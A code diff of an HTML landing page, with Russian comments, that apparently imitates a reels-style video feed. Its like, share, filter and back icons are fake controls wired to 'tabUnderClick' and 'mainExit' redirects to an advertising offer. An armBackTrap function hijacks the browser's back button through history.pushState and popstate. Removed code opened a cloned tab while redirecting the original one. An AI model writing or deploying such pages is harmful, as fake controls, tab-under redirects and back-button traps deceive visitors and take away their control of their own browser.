@@ -43,14 +43,12 @@
     /* Блокируем системный свайп, оставляем только клики */
     .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; touch-action: none; }
 
-    /* --- ВИДЕО СЛОИ --- */
     .video-layer {
       position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover;
       z-index: 0; background: #000; opacity: 0; transition: opacity 0.3s ease-out; pointer-events: none;
     }
     .video-layer.active { opacity: 1; z-index: 1; }
 
-    /* ИНТЕРФЕЙС ГРАДИЕНТ */
     .reels-ui {
       position: absolute; inset: 0; z-index: 10;
       display: flex; flex-direction: column; justify-content: space-between;
@@ -58,7 +56,6 @@
       background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
     }
 
-    /* --- КНОПКА NEXT (STAGE 1 И STAGE 2) --- */
     .next-btn-wrap {
       position: absolute; right: 14px; top: 55%; transform: translateY(-50%);
       z-index: 60; pointer-events: auto; display: flex; align-items: center; gap: 10px;
@@ -72,14 +69,12 @@
     }
     .next-icon { width: 26px; height: 26px; fill: none; stroke: #fff; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
 
-    /* --- РУКА ПОДСКАЗКА --- */
     .swipe-hint {
       position: absolute; right: 92px; top: 55%; transform: translateY(-50%);
       z-index: 70; pointer-events: none; display: flex; align-items: center; justify-content: center;
     }
     .hand-icon { font-size: 44px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: hintRight 1.35s infinite ease-in-out; }
 
-    /* --- БЛОК КНОПОК СЛЕВА (LIKE/SHARE) --- */
     .right-actions {
       position: absolute; left: 12px; bottom: 180px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto;
     }
@@ -88,14 +83,12 @@
     .action-icon { width: 24px; height: 24px; }
     .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
 
-    /* --- НИЖНЯЯ ИНФА (СЛЕВА) --- */
     .bottom-info { padding: 16px; color: #fff; pointer-events: auto; width: 100%; margin-left: 0; }
     .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
     .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid rgba(255,255,255,0.5); }
     .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
     .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
 
-    /* --- STAGE 2 КНОПКА (ОБЕРТКА) --- */
     .click-hint-overlay {
       position: absolute; right: 14px; top: 55%; transform: translateY(-50%);
       z-index: 50; display: none; align-items: center; justify-content: center; pointer-events: auto;
@@ -107,14 +100,12 @@
     }
     .glass-text { color: #fff; font-size: 16px; font-weight: 600; text-transform: uppercase; }
 
-    /* --- АНИМАЦИИ --- */
     @keyframes pulseNext { 0%, 100% { transform: scale(1); } 70% { transform: scale(1.06); } }
     @keyframes pulseGlass { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
     @keyframes hintRight { 0% { transform: translateX(-14px); opacity: 0; } 35% { opacity: 1; } 70% { transform: translateX(10px); opacity: 1; } 100% { transform: translateX(10px); opacity: 0; } }
     @keyframes shake { 10%, 90% { transform: translate3d(-2px, 0, 0); } 20%, 80% { transform: translate3d(4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-6px, 0, 0); } 40%, 60% { transform: translate3d(6px, 0, 0); } }
     .shake { animation: shake 0.4s both; }
 
-    /* Переходы из старого ленда (opacity 1) */
     .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
     .slide-in-up  { animation: slideInUp  0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
     @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
@@ -142,10 +133,7 @@
     </div>
 
     <div id="click-hint" class="click-hint-overlay">
-      <div class="glass-btn" data-mt="mainExit" data-stop="1" style="display: none;">
-        <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
-        <span class="glass-text" id="lang-text">Continue Watching</span>
-      </div>
+      <div class="glass-btn" style="display: none;"></div>
       <div class="next-btn" id="next-btn-s2" data-mt="mainExit" data-stop="1">
         <svg class="next-icon" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
@@ -153,11 +141,11 @@
 
     <div class="reels-ui">
       <div class="top-bar">
-        <svg class="back-icon" data-mt="reverse" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="back-icon" data-mt="tabUnderClick" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
           <polyline points="15 18 9 12 15 6"></polyline>
         </svg>
 
-        <div class="filter-pill" data-mt="mainExit" data-stop="1">
+        <div class="filter-pill" data-mt="tabUnderClick" data-stop="1">
           <svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
             <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
           </svg>
@@ -166,7 +154,7 @@
       </div>
 
       <div class="right-actions">
-        <div class="action-btn" data-mt="mainExit" data-stop="1">
+        <div class="action-btn" data-mt="tabUnderClick" data-stop="1">
           <div class="icon-circle">
             <svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none">
               <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
@@ -175,7 +163,7 @@
           <span class="action-text" id="ui-likes">93</span>
         </div>
 
-        <div class="action-btn" data-mt="mainExit" data-stop="1">
+        <div class="action-btn" data-mt="tabUnderClick" data-stop="1">
           <div class="icon-circle">
             <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
               <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
@@ -221,11 +209,6 @@
 
       const vib = (ms=25) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };
 
-      const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
-      const langText = document.getElementById("lang-text");
-      langText.innerText = translations[userLang] || translations.en;
-      if (userLang === 'ar') document.querySelector('.glass-btn').style.direction = 'rtl';
-
       const v1 = document.getElementById('v1');
       const v2 = document.getElementById('v2');
       const swipeHint = document.getElementById("swipe-hint");
@@ -254,14 +237,10 @@
       let touchStartY = 0;
       let touchStartX = 0;
 
-      // === ПРОВЕРКА НА КЛОНА ===
-      const isClone = urlParams.get('__cl') === '1' || urlParams.get('stage') === '2';
-
-      // === ЛОВУШКА НА КНОПКУ "НАЗАД" ===
+      // === КАСТОМНАЯ ЛОВУШКА НА КНОПКУ "НАЗАД" (Для телефона) ===
       function armBackTrap() {
         if (window.__CUSTOM_BACK_ARMED__) return;
         window.__CUSTOM_BACK_ARMED__ = true;
-
         try {
           window.history.pushState({ customStage: 2 }, "", window.location.href);
           window.addEventListener("popstate", (e) => {
@@ -272,9 +251,14 @@
         } catch (err) {}
       }
 
+      // === НАШ КЛОН ИЛИ НЕТ? ===
+      // Если common.js открыл вкладку с параметром __cl=1 (или мы сами дописали stage=2)
+      const isClone = urlParams.get('__cl') === '1' || urlParams.get('stage') === '2';
+
       if (isClone) {
+        // Мы в новой вкладке. СРАЗУ показываем второй экран!
         stage = 2;
-        swipeHint.style.display = 'flex'; // Желтая рука на 2 этапе
+        swipeHint.style.display = 'flex'; 
         nextWrap.style.display = 'none';
         clickHint.style.display = 'flex';
 
@@ -289,7 +273,7 @@
         v1.classList.remove('active');
         v2.classList.add('active');
         v2.play().catch(()=>{});
-        armBackTrap(); // Активируем бэк-трап на клоне
+        armBackTrap(); 
       } else {
         v1.play().catch(()=>{});
       }
@@ -326,38 +310,32 @@
         }, 450);
       }
 
-      // === ПЕРЕХВАТ КЛИКОВ (САМОПИСНЫЙ МИКРО-ХЕНДОФФ ДЛЯ ТВОЕГО COMMON.JS) ===
-      window.addEventListener("click", (e) => {
-        if (stage === 1) {
-          const mtBtn = e.target.closest("[data-mt]");
-          if (mtBtn) {
-            e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-            
-            // 1. Открываем КЛОН в новой вкладке (через обычный window.open, передавая все параметры)
-            try {
-              const cloneUrl = new URL(window.location.href);
-              cloneUrl.searchParams.set('__cl', '1');
-              cloneUrl.searchParams.set('stage', '2');
-              const newTab = window.open(cloneUrl.toString(), '_blank');
-              if (newTab) newTab.opener = null;
-            } catch(err) {}
-
-            // 2. Текущую вкладку отправляем на оффер, используя ТВОЙ common.js (он сам сделает replaceTo)
-            if (window.LANDING_EXITS?.run) {
-              window.LANDING_EXITS.run("tabUnderClick");
-            }
-          }
-        }
-      }, true);
-
-      // Клик по центральной кнопке на 1 экране (плавный переход, БЕЗ клона)
+      // === ОБРАБОТКА КЛИКОВ (Прямой клик по видео / кнопке Далее) ===
       nextBtn.addEventListener("click", (e) => {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        e.preventDefault(); e.stopPropagation(); 
         armBackTrap();
         doSwapToStage2();
       }, true);
 
-      // TOUCH LOGIC: Shake and Vibrate
+      // Глобальный перехват для пустого места на видео
+      wrapper.addEventListener("click", (e) => {
+        // Если юзер нажал на социалки (Лайк/Шер) -> игнорируем! Отдаем власть common.js
+        if (e.target?.closest?.("[data-mt]")) return; 
+        
+        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;
+
+        if (stage === 1) {
+            // Плавный переход на видео 2
+            armBackTrap();
+            doSwapToStage2();
+        } else if (stage === 2) {
+          // Выход на оффер
+          e.preventDefault(); e.stopPropagation();
+          if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
+        }
+      }, true);
+
+      // === ВИБРАЦИЯ ПРИ СВАЙПЕ (Без перехода) ===
       wrapper.addEventListener('touchstart', (e) => {
         touchStartY = e.changedTouches[0].screenY;
         touchStartX = e.changedTouches[0].screenX;
@@ -380,20 +358,6 @@
           }
         }
       }, { passive: true });
-
-      // Глобальный клик (клик по видео или 2 экрану)
-      wrapper.addEventListener("click", (e) => {
-        if (e.target?.closest?.("[data-mt]")) return; 
-        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;
-
-        if (stage === 1) {
-            armBackTrap();
-            doSwapToStage2();
-        } else if (stage === 2) {
-          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-          window.LANDING_EXITS?.run?.("mainExit");
-        }
-      }, true);
     });
   </script>
 </body>
